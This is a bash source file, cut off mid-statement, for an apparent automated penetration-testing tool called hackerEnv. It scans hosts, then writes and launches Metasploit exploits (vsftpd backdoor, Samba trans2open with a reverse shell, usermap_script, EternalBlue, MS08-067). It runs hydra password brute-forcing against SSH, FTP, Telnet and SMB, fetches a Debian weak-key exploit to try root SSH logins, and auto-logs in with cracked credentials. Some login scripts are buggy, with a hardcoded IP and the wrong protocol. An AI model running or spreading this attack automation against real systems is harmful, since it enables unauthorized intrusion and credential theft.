#!/bin/bash
#####################################################################################
#This program works in Kali Linux ONLY and must be root.                            #
#By running this program, you are agreeing on NOT running it aginst any public,     #
#corporate or unauthorized networks.                                                #
#Performed only when you have authorization to do.                                  #
#This tool can be found at: https://github.com/abdulr7mann                          #
#Add our hackerEnv.com community server on discord: https://discord.gg/sB5ruJ6      #
#####################################################################################
SCRIPT=$(readlink -f "$0")
SCRIPTPATH=$(dirname "$SCRIPT")
SCRIPTNAME="$0"
ARGS=( "$@" )
BRANCH="master"
self_update() {
    cd $SCRIPTPATH
    git fetch

    [ -n $(git diff --name-only origin/$BRANCH | grep $SCRIPTNAME) ] || {
        echo "Found a new version of me, updating myself..."
        git pull --force
        git checkout $BRANCH
        git pull --force
        echo "Running the new version..."
        exec bash "$SCRIPTNAME" "${ARGS[@]}"

        # Now exit this old instance
        exit 1
    }
    echo "Already the latest version."
}
function cleanning(){
if [ -f $(dirname $0)/online.txt ] && [ -f $(dirname $0)/online.txt ]
then
	rm $(dirname $0)/online.txt
	rm $(dirname $0)/urIp.txt
fi
if [ ! -d $(dirname $0)/exploits/ ]
then
	mkdir -p $(dirname $0)/exploits/{smb,ssh,ftp,apache,telnet}
fi
if [ -f report.html ]
then
	rm report.html
elif [ ! -f report.html ]
then
	touch report.html
fi
}
################################ FTP #################################
function vsftpd_234_backdoor(){
	echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mBackdoor command execution\e[0m"
	echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
	cat <<- vsftpd_234_backdoor > $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc
		use exploit/unix/ftp/vsftpd_234_backdoor
		set RHOSTS $ips
		set LHOST $ip
		run
	vsftpd_234_backdoor
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc; bash'" 2> /dev/null
	else
		tmux new-window -n vsftpdBackdoor "bash -c 'msfconsole -r $(dirname $0)/exploits/ftp/vsftpd_234_backdoor.rc; read; bash'" \; 2> /dev/null
	fi
	description="A malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011."
	remediation="It is recommended to update to the latest version."
	references="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html"
	report2
}
function ftpAnonymous(){
	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m is \e[1mvulnerable\e[0m to \e[1;91mftp anonoymous login\e[0m"
	cat <<- ftpAnony > $(dirname $0)/exploits/ftp/ftpAnonymous.exp
		#!/usr/bin/expect -f
		spawn ftp $ips 
		expect ": "
		send "anonymous\r"
		expect "Password:"
		send "\r"
		expect "ftp>"
		interact
	ftpAnony
	chmod +x $(dirname $0)/exploits/ftp/ftpAnonymous.exp
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ftp/ftpAnonymous.exp; bash'" 2> /dev/null
	else
		tmux new-window -n ftpAnonymous "bash -c 'expect $(dirname $0)/exploits/ftp/ftpAnonymous.exp; read; bash'" \; 2> /dev/null
	fi
	description="The remote FTP server allows anonymous logins. Anonymous FTP allows users without accounts to have restricted access to certain directories on the system. The configuration of systems allowing anonymous FTP should be checked carefully, as improperly configured FTP servers are frequently attacked."
	remediation="If you are not using this service, it is recommended to disable it or at least deny anonymous logins."
	references="http://www.faqs.org/rfcs/rfc2577.html"
	report2
}
############################## BruteForce #################################
function sshBruteForce(){
	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m has \e[1mweak passwords\e[0m against \e[1;91mSSH\e[0m"
	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
	then
		gzip -d /usr/share/wordlists/rockyou.txt.gz
	fi
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; bash'" 2> /dev/null
		sleep 10
	else
		tmux new-window -n sshBruteForce "bash -c 'hydra -t 4 -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ssh://$ips -o $ips/sshPassword.txt; read; bash'" \; 2> /dev/null
		sleep 10
	fi
	grep -v -e "#" $ips/sshPassword.txt | grep "\[" > $ips/sshPass.txt
	count=1
	while read pass
	do
		username="$(echo "$pass"|cut -f7-7 -d' ')"
		password="$(echo "$pass"|cut -f11-11 -d' ')"
		if [ "$pass" != "" ]
		then
			description="SSH has a weak password, very easy to guess: <b style="color:red">$pass</b>"
			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
			report2
			if [ "$username" != "" ] && [ "$password" != "" ]
			then
				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
				cat <<- sshlogin > $(dirname $0)/exploits/ssh/sshlogin$count.exp
					#!/usr/bin/expect -f
					spawn ssh $username@10.0.2.5 
					expect {
					  "*?assword" {
						send "$password\r"
						exp_continue
					  }
					  "Are you sure you want to \continue connecting" {
						send "yes\r"
						exp_continue
					  }
					}
					interact
				sshlogin
				chmod +x $(dirname $0)/exploits/ssh/sshlogin$count.exp
				if [ "$tmux" = "bash" ]
				then
					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; bash'" \; 2> /dev/null
				else
					tmux split-window -t sshBruteForce "bash -c 'expect $(dirname $0)/exploits/ssh/sshlogin$count.exp; read; bash'" \; 2> /dev/null
				fi
			fi
			((count++))
		fi
	done < $ips/sshPass.txt
}
function ftpBruteForce(){
	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m has \e[1mweak passwords\e[0m against \e[1;91mFTP\e[0m"
	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
	then
		gzip -d /usr/share/wordlists/rockyou.txt.gz
	fi
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://$ips -o $ips/ftpPassword.txt; bash'" 2> /dev/null
		sleep 10
	else
		tmux new-window -n ftpBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt ftp://$ips -o $ips/ftpPassword.txt; read; bash'" \; 2> /dev/null
		sleep 10
	fi
	grep -v -e "#" $ips/ftpPassword.txt | grep "\[" > $ips/ftpPass.txt
	count=1
	while read pass
	do
		username="$(echo "$pass"|cut -f7-7 -d' ')"
		password="$(echo "$pass"|cut -f11-11 -d' ')"
		if [ "$pass" != "" ]
		then
			description="FTP has a weak password, very easy to guess: <b style="color:red">$pass</b>"
			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
			report2
			if [ "$username" != "" ] && [ "$password" != "" ]
			then
				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
				cat <<- ftplogin > $(dirname $0)/exploits/ftp/ftplogin$count.exp
					#!/usr/bin/expect -f
					spawn ftp 10.0.2.5 
					expect {
					  ":" {
						send "$username\r"
						exp_continue
					  }
					  "*?assword" {
						send "$password\r"
						exp_continue
					  }
					}
					expect "ftp>"
					interact
				ftplogin
				chmod +x $(dirname $0)/exploits/ftp/ftplogin$count.exp
				if [ "$tmux" = "bash" ]
				then
					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; bash'" \; 2> /dev/null
				else
					tmux split-window -t ftpBruteForce "bash -c 'expect $(dirname $0)/exploits/ftp/ftplogin$count.exp; read; bash'" \; 2> /dev/null
				fi
			fi
			((count++))
		fi
	done < $ips/ftpPass.txt
}
function telnetBruteForce(){
	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m has \e[1mweak passwords\e[0m against \e[1;91mTELNET\e[0m"
	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
	then
		gzip -d /usr/share/wordlists/rockyou.txt.gz
	fi
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://$ips -o $ips/telnetPassword.txt; bash'" 2> /dev/null
		sleep 10
	else
		tmux new-window -n telnetBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt telnet://$ips -o $ips/telnetPassword.txt; read; bash'" \; 2> /dev/null
		sleep 10
	fi
	grep -v -e "#" $ips/telnetPassword.txt | grep "\[" > $ips/telnetPass.txt
	count=1
	while read pass
	do
		if [ "$pass" != "" ]
		then
			description="First of all, you should never use telnet. Second, TELNET has a weak password, very easy to guess: <b style="color:red">$pass</b>"
			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
			report2
			if [ "$username" != "" ] && [ "$password" != "" ]
			then
				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
					#!/usr/bin/expect -f
					spawn ftp 10.0.2.5 
					expect {
					  ":" {
						send "$username\r"
						exp_continue
					  }
					  "*?assword" {
						send "$password\r"
						exp_continue
					  }
					}
					expect "ftp>"
					interact
				telnetlogin
				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
				if [ "$tmux" = "bash" ]
				then
					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
				else
					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
				fi
			fi
			((count++))
		fi
	done < $ips/telnetPass.txt
}
function smbBruteForce(){
	echo -e "\e[1;34mChecking\e[0m if \e[1m$ips\e[1m has \e[1mweak passwords\e[0m against \e[1;91mSMB\e[0m"
	if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]
	then
		gzip -d /usr/share/wordlists/rockyou.txt.gz
	fi
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://$ips -o $ips/smbPassword.txt; bash'" 2> /dev/null
		sleep 10
	else
		tmux new-window -n smbBruteForce "bash -c 'hydra -I -L /usr/share/ncrack/default.usr -P /usr/share/wordlists/rockyou.txt smb://$ips -o $ips/smbPassword.txt; read; bash'" \; 2> /dev/null
		sleep 10
	fi
	grep -v -e "#" $ips/smbPassword.txt | grep "\[" > $ips/smbPass.txt
	count=1
	while read pass
	do
		if [ "$pass" != "" ]
		then
			description="SMB has a weak password, very easy to guess: <b style="color:red">$pass</b>"
			remediation="change it to 12 Characters, minimum, includes Numbers, Symbols, Capital Letters, and Lower-Case Letters avoid a dictionary word or combination of dictionary words and doesn’t rely on obvious substitutions:"
			references="https://www.howtogeek.com/195430/how-to-create-a-strong-password-and-remember-it/"
			report2
			if [ "$username" != "" ] && [ "$password" != "" ]
			then
				echo -e "Username: \e[32m$username\e[0m Password: \e[32m$password\e[0m"
				cat <<- telnetlogin > $(dirname $0)/exploits/telnet/telnetlogin$count.exp
					#!/usr/bin/expect -f
					spawn ftp 10.0.2.5 
					expect {
					  ":" {
						send "$username\r"
						exp_continue
					  }
					  "*?assword" {
						send "$password\r"
						exp_continue
					  }
					}
					expect "ftp>"
					interact
				telnetlogin
				chmod +x $(dirname $0)/exploits/telnet/telnetlogin$count.exp
				if [ "$tmux" = "bash" ]
				then
					gnome-terminal -e "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; bash'" \; 2> /dev/null
				else
					tmux split-window -t telnetBruteForce "bash -c 'expect $(dirname $0)/exploits/telnet/telnetlogin$count.exp; read; bash'" \; 2> /dev/null
				fi
			fi
			((count++))
		fi
	done < $ips/smbPass.txt
}
function OpenSSH4_7p1(){
	echo -e "$ips has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91m brute force attacks against cryptographic keys\e[0m"
    echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
	if [ ! -f $(dirname $0)/exploits/ssh/5622.tar.bz2 ]
	then
		wget -q -P $(dirname $0)/exploits/ssh/ https://www.exploit-db.com/download/5632
		wget -q -P $(dirname $0)/exploits/ssh/ https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
		sleep 10
	elif [ ! -d $(dirname $0)/exploits/ssh/rsa/ ]
	then
		tar -C $(dirname $0)/exploits/ssh/ -xjf $(dirname $0)/exploits/ssh/5622.tar.bz2
	fi
	sleep 30
	tmux new-window -n keysAttack "bash -c 'ruby $(dirname $0)/exploits/ssh/5632 $ips root $(dirname $0)/exploits/ssh/rsa/2048 > $ips/keys.txt; read; bash'" \; 2> /dev/null
	sleep 20
	grep -v -e 'testing' -e 'KEYFILE' $ips/keys.txt > $ips/key.txt
	sleep 2
	while read key
	do
		if [ "$key" != "" ]
		then
			if [ "$tmux" = "bash" ]
			then
				gnome-terminal -e "bash -c 'ssh -l root -p 22 -i $key $ips; bash'" 2> /dev/null
				sleep 10
			else
				tmux split-window -t keysAttack "bash -c 'ssh -l root -p 22 -i $key $ips; read; bash'" \; 2> /dev/null
				sleep 10
			fi
			description="A weakness has been discovered in the random number generator used by OpenSSL on Debian and Ubuntu systems. As a result of this weakness, certain encryption keys are much more common than they should be, such that an attacker could guess the key through a brute-force attack given minimal knowledge of the system. This particularly affects the use of encryption keys in OpenSSH, OpenVPN and SSL certificates. This vulnerability only affects operating systems which are based on Debian. However, other systems can be indirectly affected if weak keys are imported into them. KEYFILE FOUND: <b style="color:red">$key</b>"
			remediation="Find and fix weak OpenSSL/OpenSSH keys"
			references="https://www.techrepublic.com/blog/linux-and-open-source/find-and-fix-weak-openssl-openssh-keys-debian-based-linux-vulnerability/"
			report2
		fi
	done < $ips/key.txt
}
################################ SMB #################################
function trans2open(){
	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	cat <<- trans2open > $(dirname $0)/exploits/smb/trans2open.rc
		use exploit/linux/samba/trans2open
		set RHOSTS $ips
		set LHOST $ip
		set payload linux/x86/shell_reverse_tcp
		run
	trans2open
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/trans2open.rc; bash'" 2> /dev/null
		sleep 30
	else
		tmux new-window -n trans2open "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/trans2open.rc; read; bash'" \; 2> /dev/null
		sleep 30
	fi
	description="Buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they apparently do not allow anonymous access to IPC. "
	remediation="Upgrading to the latest version of Samba or Samba-TNG is the recommended
   solution to this vulnerability. Samba version 2.2.8a, and Samba-TNG version
   0.3.2 are not vulnerable. There will be no new releases for the 2.0 line of
   Samba code. The only fix for Samba 2.0 is to apply the patches that Samba is
   providing."
	references="https://seclists.org/bugtraq/2003/Apr/103"
	report2
}
function usermap_script(){
	echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mcommand execution\e[0m"
	echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	cat <<- usermap_script > $(dirname $0)/exploits/smb/usermap_script.rc
		use exploit/multi/samba/usermap_script
		set RHOSTS $ips
		set LHOST $ip
		run
	usermap_script
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/usermap_script.rc; bash'" 2> /dev/null
		sleep 10
	else
		tmux new-window -n usermap_script "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/usermap_script.rc; read; bash'" \; 2> /dev/null
		sleep 10
	fi
	description="This bug was originally reported against the anonymous calls
to the SamrChangePassword() MS-RPC function in combination
with the 'username map script' smb.conf option (which is not
enabled by default).
After further investigation by Samba developers, it was
determined that the problem was much broader and impacts
remote printer and file share management as well.  The root
cause is passing unfiltered user input provided via MS-RPC
calls to /bin/sh when invoking externals scripts defined
in smb.conf.  However, unlike the 'username map script'
vulnerability, the remote file and printer management scripts
require an authenticated user session."
	remediation="Upgrading to the latest version"
	references="https://www.samba.org//samba/security/CVE-2007-2447.html"
	report2
}
function ms17_010_eternalblue(){
	if [ "$smbVersion" != "" ]
	then
		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	elif [ "$smbVersion" = "" ]
	then
		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow/remote code execution\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	else
		echo -e "\e[1m$ips\e[0m has \e[1m$product $version\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mbuffer overflow\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$product $version\e[0m is in progress"
	fi
	cat <<- ms17_010_eternalblue > $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc
		use exploit/windows/smb/ms17_010_eternalblue
		set RHOSTS $ips
		set LHOST $ip
		spool $ips/notEternalBlue.txt
		run
	ms17_010_eternalblue
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; bash'" 2> /dev/null
		sleep 30
	else
		tmux new-window -n eternalblue "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_eternalblue.rc; read; bash'" \; 2> /dev/null
		sleep 30
	fi
	description="There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads."
	remediation="Apart from implementing regular patch management to systems and networks, IT/system administrators are also recommended to adopt best practices such as enabling intrusion detection and prevention systems, disabling outdated or unnecessary protocols and ports (like 445), proactively monitoring network traffic, safeguarding the endpoints, and deploying security mechanisms such data categorization and network segmentation to mitigate damage in case of exposure. Employing virtual patching can also help against unknown vulnerabilities https://blog.trendmicro.com/trendlabs-security-intelligence/ms17-010-eternalblue/"
	references="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue"
	report2
	notEternal=$(grep "but no session" $ips/notEternalBlue.txt|cut -f5-5 -d' ')
	notrternal=$(grep -oP '=\K[^-]+' $ips/notEternalBlue.txt|sed -n '/FAIL/p;1q')
	if [ "$notEternal" = "but no session" ] || [ "$notrternal" = "FAIL" ]
	then
		cat <<- ms17_010_psexec > $(dirname $0)/exploits/smb/ms17_010_psexec.rc
			use exploit/windows/smb/ms17_010_psexec
			set RHOSTS $ips
			set LHOST $ip
			spool $ips/EternalRomance.txt
			run
		ms17_010_psexec
		sleep 40
		if [ "$tmux" = "bash" ]
		then
			gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; bash'" 2> /dev/null
			sleep 30
		else
			tmux new-window -n eternalRomance "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms17_010_psexec.rc; read; bash'" \; 2> /dev/null
			sleep 30
		fi
	fi
}
function ms08_067_netapi(){
	if [ "$smbVersion" != "" ]
	then
		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	elif [ "$smbVersion" = "" ]
	then
		smbVersion=$(grep -oP 'key="title">\K[^<]+' $ips/nmapSMBVuln.xml|cut -f6-7 -d' ')
		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	else
		echo -e "\e[1m$ips\e[0m has \e[1m$smbVersion\e[0m which is \e[1mvulnerable\e[0m to \e[1;91mparsing flaw\e[0m"
		echo -e "\e[1;91mExploiting\e[0m \e[1m$smbVersion\e[0m is in progress"
	fi
	cat <<- ms08_067_netapi > $(dirname $0)/exploits/smb/ms08_067_netapi.rc
		use exploit/windows/smb/ms08_067_netapi
		set RHOSTS $ips
		set LHOST $ip
		run
	ms08_067_netapi
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms08_067_netapi.rc; bash'" 2> /dev/null
		sleep 30
	else
		tmux new-window -n netapi "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/ms08_067_netapi.rc; read; bash'" \; 2> /dev/null
		sleep 30
	fi
	description='The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka "Server Service Vulnerability."'
	remediation="Microsoft has released a set of patches for Windows 2000, XP, 2003, Vista and 2008. https://www.tenable.com/plugins/nessus/34476"
	references="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250"
	report2
}
function smbScan(){
	cat <<- smbVersion > $(dirname $0)/exploits/smb/smb_version.rc
		use auxiliary/scanner/smb/smb_version
		set RHOSTS $ips
		spool $ips/smbVersion.txt
		run
		exit
	smbVersion
	sleep 40
	if [ "$tmux" = "bash" ]
	then
		gnome-terminal -e "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/smb_version.rc; exit; bash'" 2> /dev/null
	else
		tmux new-window -n smbScan "bash -c 'msfconsole -r $(dirname $0)/exploits/smb/smb_version.rc; exit; bash'" \; 2> /dev/null
	fi
	sleep 30
	smbVersion=$(cat $ips/smbVersion.txt |grep "Samba" |grep -oP '\(\K[^\)]+')
	nmap -v0 --script vuln -p139,445 $ips -Pn -oA $ips/nmapSMBVuln
	smbvulnID=$(cat $ips/nmapSMBVuln.xml | grep -oP '\"title">\K[^\<]+'|grep -oP '\(\K[^\)]+'> $ips/nmapSMBVuln.txt)
	nmap -v0 --script smb-os-discovery.nse -p139,445 $ips -Pn -n -oA $ips/smbOS
	smbOS=$(cat $ips/smbOS.xml | grep -oP 'key="os">\K[^<]+')
	sleep 30
}
##################   rpcbind       ###############################################################
function smbclient(){
	tmux new-window -n smbclient "bash -c 'smbclient -L //$ips -N; read; bash'" \; 2> /dev/null
}
################################ REPORT GENERATION ######################
function report(){
	cat <<- report1 >> report.html
		<!DOCTYPE html>
		<html class="html">
		<title>
		REPORT
		</title>
		<head>
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<style>
		* {
		  box-sizing: border-box;
		}

		/* Create three equal columns that floats next to each other */
		.column {
		  float: left;
		  width: 25%;
		  padding: 5px;

		}

		/* background */
		.html {
		  background-color:#191A1C;
		  color:#fff;
		  font-family: "Time New Roman", Times, serif;


		}
		.p {
		  font-family: "Time New Roman", Times, serif;
		  font-size:18px;
		}

		/* Clear floats after the columns */
		.row:after {
		  content: "";
		  display: table;
		  clear: both;
		}

		/* Responsive layout - makes the three columns stack on top of each other instead of next to each other */
		@media screen and (max-width: 600px) {
		  .column {
		width: 100%;
		  }
		}
		</style>
		</head>
		<body>
	report1
}
function report2(){	
	cat <<- report2 >> report.html
		<div class="row">
		  <div class="column" style="background-color:#2D2E30;">
		<h2>Host: $ips</h2>
		  </div>
		  <div class="column" style="background-color:#2D2E30;">
		<h2>Service: $name</h2>
		  </div>
		  <div class="column" style="background-color:#2D2E30;">
		<h2>Product: $product</h2>
		  </div>
		  <div class="column" style="background-color:#2D2E30;">
		<h2>Version: $version</h2>
		  </div>
		</div>

		<p class="p"><b>Description:</b> $description<br><b>Remediation:</b> $remediation</p>
		<p>References: <a href="$references" style="color:white">$references</a>
	report2
}
function report3(){
	cat <<- report3 >> report.html
			</body>
		</html>
	report3
	echo "Report was generated => $(echo 'file://'$(pwd)'/report.html')"
}
############################### Program starts here #####################
self_update
echo "updated2"
if ! command -v figlet 2> /dev/null 1> /dev/null
then
	apt install figlet -y 2> /dev/null 1> /dev/null
else
	figlet -t -f slant "hackerEnv"
fi
if [ ! -d /usr/share/nmap/scripts/nmap-vulners ]
then
	cd /usr/share/nmap/scripts/
	git clone https://github.com/vulnersCom/nmap-vulners.git
	cd -
elif [ ! -d /usr/share/nmap/scripts/vulscan ]
then
	cd /usr/share/nmap/scripts/
	git clone https://github.com/scipag/vulscan.git
	cd -
fi
cleanning
report
if [ "$TMUX" = "" ]
then
	tmux=$(echo "bash")
else
	tmux rename-session Pentesting
	tmux rename-window -t 0 hackerEnv
fi
while getopts 'ht:i:a:s:e' OPTION; do
  case "$OPTION" in
  	h)
      echo "Usage:"
      echo "    $(basename $0) -h             Display this help message."
      echo "    $(basename $0)                Scan the entire network."
      echo "    $(basename $0) -t <ip>        Pass a specific target's IP."
      echo "    $(basename $0) -t <'ip\nip'>  Pass mutipule targets' IPs. Ex: '10.10.10.10\n20.20.20.20'"
      echo "    $(basename $0) -i <eth0>      To specify an interface."
      echo "    $(basename $0) -a <ip>        Pass attacker's IP."
      echo "    $(basename $0) -s </24>       To specify subNetwork 10.10.10.10/24 or /23 etc."
      echo "    $(basename $0) -e		Enable aggressive port scan"
      exit 0;;
    t)
      target="$OPTARG";;
    i)
      interface="$OPTARG";;
    a)
      attacker="$OPTARG";;
    s)
      subNetwork="$OPTARG";;
    e)
      aggressive=true;;
 	\?)
     echo "Invalid Option: -$OPTION" 1>&2
     echo "For usage info: $(basename $0) -h" 1>&2
     exit 1;;
  esac
done
shift "$(($OPTIND -1))"
ip a |grep -oP 'inet \K[^ ]+'| cut -f1-1 -d"/"|sed -n '2{p;q}' > $(dirname $0)/urIp.txt
ip="$(cat $(dirname $0)/urIp.txt)"
if [ "$target" != "" ] && [ "$interface" != "" ] && [ "$subNetwork" != "" ]
then
	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
	ip="$(cat $(dirname $0)/urIp.txt)"
	fping -a -g $target$subNetwork 2> /dev/null > $(dirname $0)/online.txt
	target=""
	interface=""
	subNetwork=""
elif [ "$target" != "" ] && [ "$attacker" != "" ]
then
	echo -e "$target" > $(dirname $0)/online.txt
	ips="$(cat $(dirname $0)/online.txt)"
	echo -e "$attacker" > $(dirname $0)/urIp.txt
	ip="$(cat $(dirname $0)/urIp.txt)"
	target=""
	attacker=""
elif [ "$target" != "" ] && [ "$interface" != "" ]
then
	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
	ip="$(cat $(dirname $0)/urIp.txt)"
	echo -e "$target" > $(dirname $0)/online.txt
	target=""
	interface=""
elif [ "$subNetwork" != "" ] && [ "$interface" != "" ]
then
	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
	ip="$(cat $(dirname $0)/urIp.txt)"
	fping -a -g $ip$subNetwork 2> /dev/null > $(dirname $0)/online.txt
	subNetwork=""
	interface=""
elif [ "$subNetwork" != "" ] && [ "$attacker" != "" ]
then
	ip="$(cat $(dirname $0)/urIp.txt)"
	fping -a -g $attacker$subNetwork 2> /dev/null > $(dirname $0)/online.txt
	subNetwork=""
	attacker=""
elif [ "$interface" != "" ] && [ "$attacker" != "" ]
then
	echo -e "$attacker" > $(dirname $0)/urIp.txt
	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/online.txt
	ips="$(cat $(dirname $0)/online.txt)"
	fping -a -g $ips/24 2> /dev/null > $(dirname $0)/online.txt
	interface=""
	attacker=""
elif [ "$interface" != "" ]
then
	ifconfig $interface| grep -oP 'inet \K[^ ]+' > $(dirname $0)/urIp.txt
